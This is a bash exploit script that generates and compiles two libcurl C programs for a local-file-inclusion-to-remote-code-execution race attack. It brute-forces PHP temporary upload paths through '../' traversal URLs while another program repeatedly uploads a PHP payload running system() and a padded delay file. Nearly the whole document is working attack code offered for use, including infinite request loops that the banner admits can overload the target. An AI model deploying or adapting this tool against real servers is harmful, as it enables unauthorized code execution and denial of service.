#!/bin/bash



url=$1
lfi=$2
generate_wordlist()
{
	echo -e "\e[00;33m[*] generating wordlist with crunch \e[00m"
	a=$(crunch 3 3 -f /usr/share/crunch/charset.lst lalpha -o ends.txt)
	b=$(sed 's/^/http:\/\/'$url'\/'$lfi'..\/..\/..\/..\/..\/tmp\/phpabd/' ends.txt > wordlist.txt | wc -l)
	sleep 1
	echo -e "\e[00;33m[*] wordlist created \e[00m"
	echo -e "\e[00;33m[*] host ip used: $url \e[00m"
	echo -e "\e[00;33m[*] lfi path used: $lfi \e[00m"
	c=$(head -n 1 wordlist.txt)
	echo -e "\e[00;33m[*] full url including lfi path: $c \e[00m"
	echo -e "\e[00;31m[*] IF ABOVE IS NOT CORRECT MODIFY THE PATH.\e[00m"
}

cat <<'EOF'>> exploit.c
/* gcc exploit.c -lcurl -Wall -L../package/curl-7.50.3/include/curl/curl.h -o exploit*/
#include <unistd.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <curl/curl.h>


#define LIBCURL_VERSION_NUM 0x073203 // this is libcurl 7.50.3
#define bufSize 100
#define pipeline_req 5

static void *bumba()
{
	printf("\n[*]===================================================================[*]");
	printf("\n[*] Novel LFI 2 RCE EXPLOIT BY M4LV0+J1MX                             [*]");
	printf("\n[*] THIS IS A RACE CONDITION EXPLOIT                                  [*]");
	printf("\n[*] WE MUST FIND OUR TMP FILE BEFORE THE SERVER HAS TIME TO DELETE IT [*]");
	printf("\n[*] WATCH YOU DONT DOS THE SERVER YOUR ATTACKING                      [*]");
	printf("\n[*]===================================================================[*]\n");
}
static void *nothing()
{
	return NULL;
}

int main(void)
{
bumba();
for( ; ; ){
	FILE * stream;
	char url[bufSize];
	stream = fopen("wordlist.txt", "r");
	while (fgets(url, sizeof(url), stream) != NULL){
		url[strlen(url) - 1] = '\0';
		curl_global_init(CURL_GLOBAL_ALL);
		CURLM *m_curl;
		m_curl = curl_multi_init();
		curl_multi_setopt(m_curl, CURLMOPT_PIPELINING, 1L);
		CURL *curl;
		curl = curl_easy_init();
		curl_easy_setopt(curl, CURLOPT_URL, url);
		curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);
		curl_easy_setopt(curl, CURLOPT_PATH_AS_IS, 1L);
		curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, &nothing);
		curl_multi_add_handle(m_curl, curl);
		curl_easy_perform(curl);
		int ret = 1;
		curl_multi_perform(m_curl, &ret);
		curl_multi_remove_handle(m_curl, curl);
		curl_easy_cleanup(curl);
		curl_multi_cleanup(m_curl);
		}
		fclose(stream);
	}
}
EOF
cat << EOF >> post.c
#include <curl/curl.h>
#include <stdio.h>


static void *nothing()
{
    return NULL;
}

int main(void)
{
while(1>0){
        struct curl_httppost *post = NULL;
		struct curl_httppost *last = NULL;
        CURL *curl;
        CURLcode res;

        curl = curl_easy_init();
        curl_easy_setopt(curl, CURLOPT_URL, "http://");
        curl_formadd(&post, &last, CURLFORM_COPYNAME, "big", CURLFORM_FILE, "big.php", CURLFORM_END);
        curl_formadd(&post, &last, CURLFORM_COPYNAME, "payload", CURLFORM_FILE, "payload.php", CURLFORM_END);
        curl_formadd(&post, &last, CURLFORM_COPYNAME, "payload", CURLFORM_FILE, "payload.php", CURLFORM_END);
        curl_formadd(&post, &last, CURLFORM_COPYNAME, "payload", CURLFORM_FILE, "payload.php", CURLFORM_END);
        curl_formadd(&post, &last, CURLFORM_COPYNAME, "payload", CURLFORM_FILE, "payload.php", CURLFORM_END);
        curl_formadd(&post, &last, CURLFORM_COPYNAME, "payload", CURLFORM_FILE, "payload.php", CURLFORM_END);
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, &nothing);
        curl_easy_setopt(curl, CURLOPT_HTTPPOST, post);
        res = curl_easy_perform(curl);
        curl_formfree(post);
        curl_easy_cleanup(curl);
        }
}
EOF
ready_exploit()
{
    echo -e "\e[00;33m[*] compiling exploit... \e[00m"
	d=$(gcc exploit.c -lcurl -L../package/curl-7.50.3/include/curl/curl.h -o exploit)
	sleep 1
	if [ ! -f exploit ]; then
		echo -e "\e[00;33m[-] failed to compile!\n[-] QUITTING! \e[00m"
		exit 0;
	else
    echo -e "\e[00;33m[*] compiling poster \e[00m"
    d=$(gcc post.c -lcurl -o post)
    sleep 1
    if [ ! -f post ]; then
        echo -e "\e[00;33m[-] failed to compile!\n[-] QUITTING! \e[00m"
        exit 0;
    else
	f=$(rm exploit.c ends.txt post.c)
	g=$(chmod +x exploit)
	g1=$(chmod +x post)
	echo -e "\e[00;32m[*] exploit ready \e[00m"
	fi
fi
}

prep_payloads()
{
	echo -e "\e[00;33m[*] generating payloads...\e[00m"
	rm payload.php 2>/dev/null
cat << EOF >> payload.php
<?php system("echo hello > /tmp/g");?>
EOF

    if [ ! -f payload.php ]; then
        echo -e "\e[00;33m[-] failed to create payload!\n[-] QUITTING! \e[00m"
        exit 0;
    else
	payload=$(cat payload.php)
	h=$(cat payload.php > big.php)
	echo -e "\e[00;33m[*] Payload created\n[*] $payload \e[00m"
	echo -e "\e[00;33m[*] Creating delay file.. can take time \e[00m"
	h1=$(python -c 'print "A" * 1900020' >> big.php)
	echo -e "\e[00;33m[*] delay file created.\e[00m"
fi
}

generate_wordlist
ready_exploit
sleep 5
prep_payloads
./post & ./exploit
